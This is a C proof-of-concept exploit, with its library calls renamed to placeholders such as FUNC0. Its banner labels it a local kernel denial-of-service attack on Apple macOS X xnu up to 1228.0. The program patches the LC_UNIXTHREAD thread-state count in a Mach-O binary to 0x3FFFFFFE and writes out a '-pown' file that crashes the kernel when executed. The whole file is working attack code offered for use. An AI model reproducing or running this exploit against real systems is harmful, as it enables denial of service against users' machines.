#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct thread_command {scalar_t__ cmd; scalar_t__ flavor; int count; } ;
struct stat {int st_size; int /*<<< orphan*/  st_mode; } ;

/* Variables and functions */
 int EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 scalar_t__ LC_UNIXTHREAD ; 
 int MAX_PATH_LEN ; 
 int O_CREAT ; 
 int O_RDONLY ; 
 int O_RDWR ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 scalar_t__ FUNC5 (int,struct stat*) ; 
 int FUNC6 (char*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int FUNC9 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (char*,int,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,int) ; 
 scalar_t__ x86_THREAD_STATE32 ; 
 char* FUNC13 (int) ; 

int
FUNC14 (int argc, char ** argv)
{
  char fnbuf[MAX_PATH_LEN], *ptr, *cur, *end;
  int fd, wfd, found, size;
  struct stat fbuf;

  FUNC8 ("Apple MACOS X xnu <= 1228.0 local kernel DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc <= 1)
    {
      FUNC3 (stderr, "Usage: %s <macho-o binary>\n", argv[0]);
      FUNC1 (EXIT_SUCCESS);
    }

  if ((fd = FUNC6 (argv[1], O_RDONLY)) == -1)
    {
      FUNC7 ("open ()");
      FUNC1 (EXIT_FAILURE);
    }

  FUNC10 (fnbuf, sizeof fnbuf, "%s-pown", argv[1]);

  if ((wfd = FUNC6 (fnbuf, O_RDWR | O_CREAT)) == -1)
    {
      FUNC7 ("open ()");
      FUNC1 (EXIT_FAILURE);
    }

  if (FUNC5 (fd, &fbuf) < 0)
    {
      FUNC7 ("fstat ()");
      FUNC1 (EXIT_FAILURE);
    }

  size = fbuf.st_size;
  ptr = FUNC13 (sizeof (char) * size);
  end = ptr + size;

  if (FUNC9 (fd, ptr, size) < size)
    {
      FUNC11 (fnbuf);

      FUNC7 ("write ()");
      FUNC1 (EXIT_FAILURE);
    }

  FUNC0 (fd);

  for (cur = ptr, found = 0;
       !found && cur + sizeof (struct thread_command) < end;
       cur += sizeof (unsigned long))
    {
      struct thread_command *thr_cmd;

      thr_cmd = (struct thread_command *) cur;
      if (thr_cmd->cmd == LC_UNIXTHREAD &&
          thr_cmd->flavor == x86_THREAD_STATE32)
        {
          thr_cmd->count = 0x3FFFFFFE;
          FUNC8 ("* found at offset @0x%08X\n", cur - ptr);
          found = 1;
        }
    }

  if (!found)
    {
      FUNC11 (fnbuf);

      FUNC3 (stderr, "* ARGH! hueristic didn't find our target!\n");
      FUNC1 (EXIT_FAILURE);
    }

  FUNC12 (wfd, ptr, size);
  FUNC2(wfd, fbuf.st_mode);
  FUNC0 (wfd);

  FUNC4 (ptr);
  FUNC3 (stdout, "* done\nexecute ./%s at your own risk!$%%!\n", fnbuf);

  return (EXIT_SUCCESS);
}